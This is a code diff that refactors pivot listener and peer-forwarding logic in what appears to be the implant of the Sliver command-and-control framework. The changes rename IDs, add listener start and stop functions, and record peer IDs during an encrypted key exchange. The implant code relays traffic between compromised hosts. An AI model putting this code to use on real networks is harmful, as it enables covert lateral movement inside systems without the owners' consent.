@@ -43,17 +43,26 @@ const (
 )
 
 var (
-	ErrFailedWrite       = errors.New("failed to write")
+	// ErrFailedWrite - Failed to write to a connection
+	ErrFailedWrite = errors.New("failed to write")
+	// ErrFailedKeyExchange - Failed to exchange session and/or peer keys
 	ErrFailedKeyExchange = errors.New("failed key exchange")
 
 	pivotListeners = &sync.Map{}
 	listenerID     = uint32(0)
 
-	PeerID = PivotID() // This implant's Peer ID, a per-execution instance ID
+	PeerID = generatePeerID() // This implant's Peer ID, a per-execution instance ID
 )
 
-// StartListener - Generic interface to a start listener function
-type StartListener func(string, chan<- *pb.Envelope) (*PivotListener, error)
+// generatePeerID - Generate a new pivot id
+func generatePeerID() int64 {
+	buf := make([]byte, 8)
+	rand.Read(buf)
+	return int64(binary.LittleEndian.Uint64(buf))
+}
+
+// CreateListener - Generic interface to a start listener function
+type CreateListener func(string, chan<- *pb.Envelope) (*PivotListener, error)
 
 // GetListeners - Get a list of active listeners
 func GetListeners() []*pb.PivotListener {
@@ -71,6 +80,36 @@ func AddListener(listener *PivotListener) {
 	pivotListeners.Store(listener.ID, listener)
 }
 
+// RemoveListener - Stop a pivot listener
+func RemoveListener(id uint32) {
+	if listener, ok := pivotListeners.LoadAndDelete(id); ok {
+		listener.(*PivotListener).Stop()
+	}
+}
+
+// StartAllListeners - Start all pivot listeners
+func StartAllListeners() {
+	pivotListeners.Range(func(key, value interface{}) bool {
+		value.(*PivotListener).Start()
+		return true
+	})
+}
+
+// StopAllListeners - Stop all pivot listeners
+func StopAllListeners() {
+	pivotListeners.Range(func(key, value interface{}) bool {
+		value.(*PivotListener).Stop()
+		return true
+	})
+}
+
+// StartListener - Stop a pivot listener
+func StartListener(id uint32) {
+	if listener, ok := pivotListeners.Load(id); ok {
+		listener.(*PivotListener).Start()
+	}
+}
+
 // StopListener - Stop a pivot listener
 func StopListener(id uint32) {
 	if listener, ok := pivotListeners.Load(id); ok {
@@ -79,19 +118,19 @@ func StopListener(id uint32) {
 }
 
 // SendToPeer - Forward an envelope to a peer
-func SendToPeer(envelope *pb.Envelope) bool {
+func SendToPeer(envelope *pb.Envelope) (bool, int64) {
 	peerEnvelope := &pb.PivotPeerEnvelope{}
 	err := proto.Unmarshal(envelope.Data, peerEnvelope)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("Failed to unmarshal peer envelope: %s", err)
 		// {{end}}
-		return false
+		return false, peerEnvelope.PeerID
 	}
 
 	// {{if .Config.Debug}}
 	log.Printf("Peer Envelope: %v", peerEnvelope)
-	log.Printf("Send to downstream pivot id: %d", peerEnvelope.PivotID)
+	log.Printf("Send to downstream pivot id: %d", peerEnvelope.PeerID)
 	// {{end}}
 
 	downstreamEnvelope := &pb.Envelope{
@@ -103,47 +142,44 @@ func SendToPeer(envelope *pb.Envelope) bool {
 		// {{if .Config.Debug}}
 		log.Printf("Failed to unmarshal downstream envelope: %s", err)
 		// {{end}}
-		return false
+		return false, peerEnvelope.PeerID
 	}
 
-	// NOTE: Yes linear search is bad, but there should be a very small
-	// number of listeners and pivots so it should be fine
 	sent := false // Controls iteration of outer loop
 	pivotListeners.Range(func(key interface{}, value interface{}) bool {
 		listener := value.(*PivotListener)
-		listener.Pivots.Range(func(key interface{}, value interface{}) bool {
-			pivot := value.(*NetConnPivot)
-			if pivot.ID() == peerEnvelope.PivotID {
-				pivot.Downstream <- downstreamEnvelope
-				sent = true  // break from the outer loop
-				return false // stop iterating inner loop
-			}
-			return true // keep iterating inner loop
-		})
+		pivotConn, ok := listener.PivotConnections.Load(peerEnvelope.PeerID)
+		if ok {
+			pivot := pivotConn.(*NetConnPivot)
+			pivot.Downstream <- downstreamEnvelope
+			sent = true  // break from the outer loop
+			return false // stop iterating inner loop
+		}
 		return !sent // keep iterating while not sent
 	})
 	// {{if .Config.Debug}}
 	if !sent {
-		log.Printf("Failed to find pivot with id %d", peerEnvelope.PivotID)
+		log.Printf("Failed to find peer with id %d", peerEnvelope.PeerID)
+		return false, peerEnvelope.PeerID
 	}
 	// {{end}}
-	return sent
+	return sent, 0
 }
 
 // PivotListener - A pivot listener
 type PivotListener struct {
-	ID          uint32
-	Type        pb.PivotType
-	Listener    net.Listener
-	Pivots      *sync.Map // ID -> NetConnPivot
-	BindAddress string
-	Upstream    chan<- *pb.Envelope
+	ID               uint32
+	Type             pb.PivotType
+	Listener         net.Listener
+	PivotConnections *sync.Map // ID -> NetConnPivot
+	BindAddress      string
+	Upstream         chan<- *pb.Envelope
 }
 
 // ToProtobuf - Get the protobuf version of the pivot listener
 func (l *PivotListener) ToProtobuf() *pb.PivotListener {
-	pivotPeers := []*pb.PivotPeer{}
-	l.Pivots.Range(func(key interface{}, value interface{}) bool {
+	pivotPeers := []*pb.NetConnPivot{}
+	l.PivotConnections.Range(func(key interface{}, value interface{}) bool {
 		pivot := value.(*NetConnPivot)
 		pivotPeers = append(pivotPeers, pivot.ToProtobuf())
 		return true
@@ -156,21 +192,45 @@ func (l *PivotListener) ToProtobuf() *pb.PivotListener {
 	}
 }
 
+// Start - Start the pivot listener
+func (p *PivotListener) Start() error {
+	for {
+		conn, err := p.Listener.Accept()
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("[tcp-pivot] listener stopping: %s", err)
+			// {{end}}
+			return err
+		}
+		// handle connection like any other net.Conn
+		pivotConn := &NetConnPivot{
+			conn:          conn,
+			readMutex:     &sync.Mutex{},
+			writeMutex:    &sync.Mutex{},
+			readDeadline:  tcpPivotReadDeadline,
+			writeDeadline: tcpPivotWriteDeadline,
+			upstream:      p.Upstream,
+			Downstream:    make(chan *pb.Envelope),
+		}
+		go pivotConn.Start(p.PivotConnections)
+	}
+}
+
 // Stop - Stop the pivot listener
 func (l *PivotListener) Stop() {
 	// Close all peer connections before closing listener
-	l.Pivots.Range(func(key interface{}, value interface{}) bool {
+	l.PivotConnections.Range(func(key interface{}, value interface{}) bool {
 		value.(*NetConnPivot).Close()
 		return true
 	})
-	l.Pivots = nil
+	l.PivotConnections = nil
 	l.Listener.Close()
 }
 
 // PivotClose - Close a pivot connection
 func (l *PivotListener) PivotClose(id int64) {
-	if p, ok := l.Pivots.Load(id); ok {
-		l.Pivots.Delete(id)
+	if p, ok := l.PivotConnections.Load(id); ok {
+		l.PivotConnections.Delete(id)
 		p.(*NetConnPivot).Close()
 	}
 }
@@ -181,36 +241,29 @@ func ListenerID() uint32 {
 	return listenerID
 }
 
-// PivotID - Generate a new pivot id
-func PivotID() int64 {
-	buf := make([]byte, 8)
-	rand.Read(buf)
-	return int64(binary.LittleEndian.Uint64(buf))
-}
-
 // NetConnPivot - A generic pivot connection to a peer via net.Conn
 type NetConnPivot struct {
-	id            int64
-	conn          net.Conn
-	readMutex     *sync.Mutex
-	writeMutex    *sync.Mutex
-	cipherCtx     *cryptography.CipherContext
-	readDeadline  time.Duration
-	writeDeadline time.Duration
+	downstreamPeerID int64
+	conn             net.Conn
+	readMutex        *sync.Mutex
+	writeMutex       *sync.Mutex
+	cipherCtx        *cryptography.CipherContext
+	readDeadline     time.Duration
+	writeDeadline    time.Duration
 
 	upstream   chan<- *pb.Envelope
 	Downstream chan *pb.Envelope
 }
 
-// ID - ID of peer pivot
-func (p *NetConnPivot) ID() int64 {
-	return p.id
+// DownstreamPeerID - ID of peer pivot
+func (p *NetConnPivot) DownstreamPeerID() int64 {
+	return p.downstreamPeerID
 }
 
 // ToProtobuf - Protobuf of pivot peer
-func (p *NetConnPivot) ToProtobuf() *pb.PivotPeer {
-	return &pb.PivotPeer{
-		ID:            p.id,
+func (p *NetConnPivot) ToProtobuf() *pb.NetConnPivot {
+	return &pb.NetConnPivot{
+		PeerID:        p.downstreamPeerID,
 		RemoteAddress: p.RemoteAddress(),
 	}
 }
@@ -223,13 +276,13 @@ func (p *NetConnPivot) Start(pivots *sync.Map) {
 		return
 	}
 	// {{if .Config.Debug}}
-	log.Printf("[pivot] peer key exchange completed successfully")
+	log.Printf("[pivot] peer key exchange completed successfully with peer %d", p.downstreamPeerID)
 	// {{end}}
 
 	// We don't want to register the peer prior to the key exchange
 	// Add & remove self from listener pivots map
-	pivots.Store(p.ID(), p)
-	defer pivots.Delete(p.ID())
+	pivots.Store(p.DownstreamPeerID(), p)
+	defer pivots.Delete(p.DownstreamPeerID())
 
 	go func() {
 		defer close(p.Downstream)
@@ -252,10 +305,9 @@ func (p *NetConnPivot) Start(pivots *sync.Map) {
 				// {{end}}
 				envelopeData, _ := proto.Marshal(envelope)
 				data, _ := proto.Marshal(&pb.PivotPeerEnvelope{
-					PeerID:  PeerID, // This proccess' Peer ID
-					PivotID: p.ID(), // The Pivot connection ID
-					Name:    consts.SliverName,
-					Data:    envelopeData,
+					PeerID: PeerID, // This proccess' Peer ID
+					Name:   consts.SliverName,
+					Data:   envelopeData,
 				})
 				p.upstream <- &pb.Envelope{
 					ID:   0, // Pivot server implementation uses handlers, so ID must be zero
@@ -301,6 +353,7 @@ func (p *NetConnPivot) peerKeyExchange() error {
 		// {{end}}
 		return ErrFailedKeyExchange
 	}
+	p.downstreamPeerID = peerHello.PeerID
 	sessionKey := cryptography.RandomKey()
 	p.cipherCtx = cryptography.NewCipherContext(sessionKey)
 	ciphertext, err := cryptography.ECCEncryptToPeer(peerHello.PublicKey, peerHello.PublicKeySignature, sessionKey[:])
